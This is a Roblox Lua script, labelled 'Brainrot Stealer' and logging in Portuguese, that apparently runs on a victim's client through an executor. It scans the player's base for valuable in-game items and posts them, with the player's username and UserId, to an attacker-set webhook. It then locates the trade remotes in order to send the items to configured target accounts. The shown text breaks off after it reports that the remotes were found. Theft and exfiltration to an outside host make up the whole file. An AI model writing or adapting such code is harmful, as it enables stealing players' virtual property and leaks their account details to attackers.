if game.PlaceId ~= 109983668079237 then
    return
end

print("[Stealer] Carregando...")

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

local TARGET_USERS = getgenv().TARGET_USERS or {}
if #TARGET_USERS == 0 and getgenv().TARGET_USER then
    TARGET_USERS = {getgenv().TARGET_USER}
end
local WEBHOOK_URL = getgenv().WEBHOOK_URL or ""
local TARGET_BRAINROTS = getgenv().NORMAL_BRAINROTS or {}
local TARGET_BASE_SKINS = getgenv().NORMAL_BASE_SKINS or {}
local TARGET_GEARS = getgenv().NORMAL_GEARS or {}
local DELAY_BETWEEN_INVITES = getgenv().DELAY_BETWEEN_INVITES or 15

local tradeCompleted = false
local webhookSent = false

local function getRemote(name)
    local net = ReplicatedStorage:FindFirstChild("Packages")
    if net then
        net = net:FindFirstChild("Net")
        if net then
            local children = net:GetChildren()
            for i = 1, #children - 1 do
                if children[i] and children[i].Name and string.find(children[i].Name, name) then
                    return children[i + 1]
                end
            end
        end
    end
    return nil
end

local function findPlayerBase()
    local plots = Workspace:FindFirstChild("Plots")
    if not plots then return nil end
    
    local username = LocalPlayer.Name
    local displayName = LocalPlayer.DisplayName
    
    for _, plot in ipairs(plots:GetChildren()) do
        if plot:IsA("Model") then
            local plotSign = plot:FindFirstChild("PlotSign")
            if plotSign then
                local surfaceGui = plotSign:FindFirstChildOfClass("SurfaceGui")
                if surfaceGui then
                    local frame = surfaceGui:FindFirstChild("Frame")
                    if frame then
                        local textLabel = frame:FindFirstChildOfClass("TextLabel")
                        if textLabel then
                            local text = textLabel.Text
                            if text then
                                local clean = text:gsub("'s Base$", ""):gsub(" Base$", "")
                                if clean == username or clean == displayName then
                                    return plot
                                end
                            end
                        end
                    end
                end
            end
        end
    end
    return nil
end

local function getAnimalNames()
    local names = {}
    local animalsFolder = ReplicatedStorage:FindFirstChild("Animations")
    if animalsFolder then
        animalsFolder = animalsFolder:FindFirstChild("Animals")
        if animalsFolder then
            for _, child in ipairs(animalsFolder:GetChildren()) do
                if child:IsA("Folder") then
                    names[child.Name] = true
                end
            end
        end
    end
    return names
end

local function scanBrainrots()
    local base = findPlayerBase()
    if not base then return {} end
    
    local animalNames = getAnimalNames()
    local found = {}
    
    for _, child in ipairs(base:GetChildren()) do
        if child:IsA("Model") and animalNames[child.Name] then
            if TARGET_BRAINROTS[child.Name] then
                local gen = 0
                pcall(function()
                    local Animals2 = require(ReplicatedStorage:FindFirstChild("Shared"):FindFirstChild("Animals"))
                    if Animals2 then
                        gen = Animals2:GetGeneration(child.Name, nil, {}, nil)
                    end
                end)
                
                table.insert(found, {
                    name = child.Name,
                    gen = gen,
                    slotKey = child.Name,
                    model = child
                })
            end
        end
    end
    
    table.sort(found, function(a, b) return a.gen > b.gen end)
    return found
end

local function formatNumber(n)
    if not n or n == 0 then return "$0/s" end
    if n >= 1e12 then return "$" .. string.format("%.2fT", n / 1e12):gsub("%.?0+$", "")
    elseif n >= 1e9 then return "$" .. string.format("%.2fB", n / 1e9):gsub("%.?0+$", "")
    elseif n >= 1e6 then return "$" .. string.format("%.2fM", n / 1e6):gsub("%.?0+$", "")
    elseif n >= 1e3 then return "$" .. string.format("%.2fK", n / 1e3):gsub("%.?0+$", "")
    else return "$" .. math.floor(n) .. "/s" end
end

local function sendWebhook(brainrots)
    if WEBHOOK_URL == "" or webhookSent then return end
    webhookSent = true
    
    local request = syn and syn.request or (http and http.request or (http_request or request))
    if not request then return end
    
    local lines = {}
    if #brainrots > 0 then
        for _, item in ipairs(brainrots) do
            table.insert(lines, "**" .. item.name .. "** [Brainrot] | Gen: **" .. formatNumber(item.gen) .. "**")
        end
    else
        table.insert(lines, "Nenhum brainrot encontrado!")
    end
    
    local description = table.concat(lines, "\n")
    if #description > 4000 then
        description = description:sub(1, 3996) .. "..."
    end
    
    local executorName = "Unknown"
    pcall(function()
        if identifyexecutor then executorName = identifyexecutor()
        elseif getexecutorname then executorName = getexecutorname() end
    end)
    
    local embed = {
        title = "Brainrot Stealer",
        description = description,
        color = 0xFF0000,
        fields = {
            {
                name = "Server",
                value = "Players: **" .. #Players:GetPlayers() .. "**",
                inline = true
            },
            {
                name = "Executor",
                value = executorName,
                inline = true
            }
        },
        footer = {
            text = LocalPlayer.Name .. " • " .. LocalPlayer.UserId
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
    }
    
    pcall(function()
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode({
                content = "@everyone",
                embeds = { embed },
                username = "Stealer",
                avatar_url = "https://i.ibb.co/Zzd40XF2/IMG-1023.png"
            })
        })
        print("[Stealer] Webhook enviado!")
    end)
end

local function getUserIdFromName(username)
    if type(username) == "number" then return username end
    local success, result = pcall(function()
        return Players:GetUserIdFromNameAsync(username)
    end)
    if success and result then
        return result
    end
    return nil
end

local function isPlayerOnline(userId)
    for _, player in ipairs(Players:GetPlayers()) do
        if player.UserId == userId then
            return true
        end
    end
    return false
end

local function main()
    print("[Stealer] SEM BLOQUEIO DE UI - Modo Teste")
    print("[Stealer] Apenas escaneia, webhook e envia trade")
    
    local brainrots = scanBrainrots()
    print("[Stealer] Brainrots encontrados: " .. #brainrots)
    
    sendWebhook(brainrots)
    
    if #brainrots == 0 then
        print("[Stealer] Nenhum brainrot encontrado!")
        return
    end
    
    if #TARGET_USERS == 0 then
        print("[Stealer] Nenhum target configurado!")
        return
    end
    
    local inviteRemote = getRemote("TradeService/Invite")
    local addBrainrotRemote = getRemote("TradeService/AddBrainrot")
    local readyRemote = getRemote("TradeService/Ready")
    local acceptRemote = getRemote("TradeService/Accept")
    
    print("[Stealer] Remotes encontrados:")
